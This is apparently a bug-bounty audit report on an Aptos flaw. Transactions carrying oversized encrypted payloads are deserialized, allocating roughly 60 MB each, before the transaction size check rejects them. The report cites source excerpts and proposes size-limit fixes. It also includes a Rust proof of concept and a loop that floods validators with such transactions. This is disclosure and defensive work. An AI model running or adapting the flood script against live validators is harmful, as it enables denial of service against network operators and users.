# Audit Report

## Title
Unvalidated Ciphertext Size Allows Memory and Bandwidth Exhaustion Before Transaction Validation

## Summary

The batch encryption system allows creation of ciphertexts with arbitrarily large encrypted payloads (up to network message limits of 64 MB) that are deserialized and allocate memory before transaction size validation occurs. An attacker can exploit this to exhaust validator memory and bandwidth by repeatedly submitting transactions with oversized ciphertexts that get rejected only after resource consumption.

## Finding Description

The vulnerability exists in the transaction deserialization flow where encrypted transaction payloads are processed without size validation until after BCS deserialization allocates memory.

**The Attack Path:**

1. The `SymmetricCiphertext` struct contains an unbounded `ct_body: Vec<u8>` field with no size constraints: [1](#0-0) 

2. This ciphertext is embedded in `BIBECiphertext`, which is part of the `Ciphertext<PCT>` type used in `EncryptedPayload`: [2](#0-1) 

3. Encrypted transactions use `TransactionPayload::EncryptedPayload` variant: [3](#0-2) 

4. The network layer allows messages up to 64 MB: [4](#0-3) 

5. When a transaction is received, BCS deserialization happens at the network layer BEFORE any transaction validation: [5](#0-4) 

6. Transaction size validation only occurs AFTER deserialization in the VM's gas checking logic: [6](#0-5) 

7. The transaction size is computed from the already-deserialized transaction: [7](#0-6) 

**The Exploitation:**

An attacker crafts a transaction with an `EncryptedPayload` containing a ciphertext with a `ct_body` of approximately 60 MB. When validators receive this transaction:

1. Network layer accepts it (60 MB < 64 MB MAX_MESSAGE_SIZE)
2. BCS deserialization allocates 60 MB for the `ct_body` Vec<u8>
3. Transaction size validation rejects it (60 MB > 6 MB typical MAX_TRANSACTION_SIZE_IN_BYTES)
4. Memory allocation and bandwidth consumption already occurred

By repeatedly sending such transactions, an attacker can:
- Exhaust validator memory through repeated large allocations
- Consume network bandwidth transmitting oversized messages
- Cause processing delays from deserializing large structures
- Trigger memory pressure and potential OOM conditions

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits" because memory is allocated before these limits are enforced.

## Impact Explanation

This qualifies as **High Severity** per the Aptos bug bounty criteria: "Validator node slowdowns" and resource exhaustion.

**Quantified Impact:**
- **Memory Exhaustion**: Each attack transaction allocates ~60 MB during deserialization
- **Bandwidth Exhaustion**: Each transaction consumes ~60 MB of network bandwidth
- **DoS Potential**: An attacker can flood validators with these transactions, causing:
  - Memory pressure affecting validator performance
  - Network congestion blocking legitimate transactions
  - CPU overhead deserializing large structures
  - Potential validator crashes from OOM conditions

**Affected Nodes**: All validators receiving transactions from the network or mempool are vulnerable.

## Likelihood Explanation

**Likelihood: High**

This attack is highly likely because:
1. **No special access required**: Any transaction sender can create encrypted payloads
2. **Simple to execute**: Just craft a transaction with an oversized ciphertext
3. **No rate limiting**: The validation happens after resource consumption, so rate limiting is bypassed
4. **Repeatable**: Attacker can send many such transactions to amplify the impact
5. **No cost to attacker**: Transactions are rejected before gas payment, so attack is essentially free

The only barrier is the encrypted transaction feature must be enabled, but this is part of the production codebase.

## Recommendation

Implement size validation for ciphertext components BEFORE deserialization. Add explicit size checks at multiple layers:

**1. Add maximum ciphertext size constant:**
```rust
// In crates/aptos-batch-encryption/src/shared/symmetric.rs
pub const MAX_SYMMETRIC_CIPHERTEXT_SIZE: usize = 1024 * 1024; // 1 MB
```

**2. Validate ciphertext size during creation:**
```rust
// In SymmetricKey::encrypt()
pub fn encrypt<R: RngCore + CryptoRng>(
    &self,
    rng: &mut R,
    plaintext: &impl Plaintext,
) -> Result<SymmetricCiphertext> {
    let mut plaintext_bytes = Vec::new();
    bcs::serialize_into(&mut plaintext_bytes, &plaintext)
        .map_err(|_| BatchEncryptionError::SerializationError)?;
    
    // ADD SIZE CHECK
    if plaintext_bytes.len() > MAX_SYMMETRIC_CIPHERTEXT_SIZE {
        return Err(BatchEncryptionError::CiphertextTooLarge)?;
    }
    
    // ... rest of encryption logic
}
```

**3. Validate during deserialization with custom deserializer:**
```rust
// Add custom deserializer for SymmetricCiphertext
impl<'de> Deserialize<'de> for SymmetricCiphertext {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        let (nonce, ct_body): (SymmetricNonce, Vec<u8>) = Deserialize::deserialize(deserializer)?;
        
        // Validate size before accepting
        if ct_body.len() > MAX_SYMMETRIC_CIPHERTEXT_SIZE {
            return Err(serde::de::Error::custom("ciphertext body exceeds maximum size"));
        }
        
        Ok(SymmetricCiphertext { nonce, ct_body })
    }
}
```

**4. Add early validation in transaction processing:**
Check ciphertext sizes before full transaction deserialization in the network message handling layer.

## Proof of Concept

**Rust-based reproduction:**

```rust
use aptos_types::transaction::{
    EncryptedPayload, SignedTransaction, RawTransaction, TransactionPayload
};
use aptos_batch_encryption::schemes::fptx_weighted::FPTXWeighted;
use aptos_batch_encryption::traits::BatchThresholdEncryption;

fn create_oversized_ciphertext_attack() -> SignedTransaction {
    // 1. Create a large plaintext (approaching 60 MB)
    let huge_plaintext = vec![0u8; 60 * 1024 * 1024];
    
    // 2. Create encryption setup
    let mut rng = rand::thread_rng();
    let tc = ShamirThresholdConfig::new(3, 5);
    let (ek, _, _, _) = FPTXWeighted::setup_for_testing(0, 1000, 1, &tc).unwrap();
    
    // 3. Encrypt the huge plaintext
    let associated_data = String::from("attack");
    let ciphertext = ek.encrypt(&mut rng, &huge_plaintext, &associated_data).unwrap();
    
    // 4. Create EncryptedPayload with the oversized ciphertext
    let encrypted_payload = EncryptedPayload::Encrypted {
        ciphertext,
        extra_config: TransactionExtraConfig::default(),
        payload_hash: HashValue::zero(),
    };
    
    // 5. Create transaction with the encrypted payload
    let raw_txn = RawTransaction::new(
        AccountAddress::random(),
        0,
        TransactionPayload::EncryptedPayload(encrypted_payload),
        100000,
        1,
        u64::MAX,
        ChainId::test(),
    );
    
    // 6. Sign and return
    let private_key = Ed25519PrivateKey::generate_for_testing();
    raw_txn.sign(&private_key, Ed25519PublicKey::from(&private_key)).unwrap()
}

// When this transaction is sent to a validator:
// - Network layer accepts it (< 64 MB)
// - BCS deserializes it, allocating ~60 MB
// - Transaction validation rejects it (> 6 MB limit)
// - But memory was already allocated and bandwidth consumed
```

**Attack script:**
```rust
// Flood validators with oversized ciphertext transactions
for _ in 0..100 {
    let attack_txn = create_oversized_ciphertext_attack();
    network_client.send_transaction(attack_txn).await;
    // Each iteration consumes ~60 MB of validator memory during deserialization
    // Total: 6 GB memory consumption + bandwidth before rejection
}
```

**Notes:**

The vulnerability is confirmed by the absence of size validation in the critical path between network reception and transaction validation. The encryption system's flexible design allows arbitrary plaintext sizes to be encrypted without upper bounds, creating a resource exhaustion vector that bypasses early validation checks.

### Citations

**File:** crates/aptos-batch-encryption/src/shared/symmetric.rs (L45-50)
```rust
#[derive(Debug, Clone, Serialize, Deserialize, Hash, PartialEq, Eq)]
pub struct SymmetricCiphertext {
    nonce: SymmetricNonce,
    #[serde(with = "serde_bytes")]
    ct_body: Vec<u8>,
}
```

**File:** crates/aptos-batch-encryption/src/shared/ciphertext/bibe.rs (L41-48)
```rust
#[derive(Clone, Serialize, Deserialize, Debug, Hash, Eq, PartialEq)]
pub struct BIBECiphertext {
    pub id: Id,
    #[serde(serialize_with = "ark_se", deserialize_with = "ark_de")]
    ct_g2: [G2Affine; 3],
    padded_key: OneTimePaddedKey,
    symmetric_ciphertext: SymmetricCiphertext,
}
```

**File:** types/src/transaction/mod.rs (L688-706)
```rust
/// Different kinds of transactions.
#[derive(Clone, Debug, Hash, Eq, PartialEq, Serialize, Deserialize)]
pub enum TransactionPayload {
    /// A transaction that executes code.
    Script(Script),
    /// Deprecated.
    ModuleBundle(DeprecatedPayload),
    /// A transaction that executes an existing entry function published on-chain.
    EntryFunction(EntryFunction),
    /// A multisig transaction that allows an owner of a multisig account to execute a pre-approved
    /// transaction as the multisig account.
    Multisig(Multisig),
    /// A new transaction payload format with support for versioning.
    /// Contains an executable (script/entry function) along with extra configuration.
    /// Once this new format is fully rolled out, above payload variants will be deprecated.
    Payload(TransactionPayloadInner),
    /// Represents an encrypted transaction payload
    EncryptedPayload(EncryptedPayload),
}
```

**File:** types/src/transaction/mod.rs (L1294-1298)
```rust
    pub fn raw_txn_bytes_len(&self) -> usize {
        *self.raw_txn_size.get_or_init(|| {
            bcs::serialized_size(&self.raw_txn).expect("Unable to serialize RawTransaction")
        })
    }
```

**File:** config/src/config/network_config.rs (L47-50)
```rust
pub const MAX_APPLICATION_MESSAGE_SIZE: usize =
    (MAX_MESSAGE_SIZE - MAX_MESSAGE_METADATA_SIZE) - MESSAGE_PADDING_SIZE; /* The message size that applications should check against */
pub const MAX_FRAME_SIZE: usize = 4 * 1024 * 1024; /* 4 MiB large messages will be chunked into multiple frames and streamed */
pub const MAX_MESSAGE_SIZE: usize = 64 * 1024 * 1024; /* 64 MiB */
```

**File:** network/framework/src/protocols/wire/messaging/v1/mod.rs (L226-241)
```rust
        match self.project().framed_read.poll_next(cx) {
            Poll::Ready(Some(Ok(frame))) => {
                let frame = frame.freeze();

                match bcs::from_bytes(&frame) {
                    Ok(message) => Poll::Ready(Some(Ok(message))),
                    // Failed to deserialize the NetworkMessage
                    Err(err) => {
                        let mut frame = frame;
                        let frame_len = frame.len();
                        // Keep a few bytes from the frame for debugging
                        frame.truncate(8);
                        let err = ReadError::DeserializeError(err, frame_len, frame);
                        Poll::Ready(Some(Err(err)))
                    },
                }
```

**File:** aptos-move/aptos-vm/src/gas.rs (L109-121)
```rust
    } else if txn_metadata.transaction_size > txn_gas_params.max_transaction_size_in_bytes {
        speculative_warn!(
            log_context,
            format!(
                "[VM] Transaction size too big {} (max {})",
                txn_metadata.transaction_size, txn_gas_params.max_transaction_size_in_bytes
            ),
        );
        return Err(VMStatus::error(
            StatusCode::EXCEEDED_MAX_TRANSACTION_SIZE,
            None,
        ));
    }
```
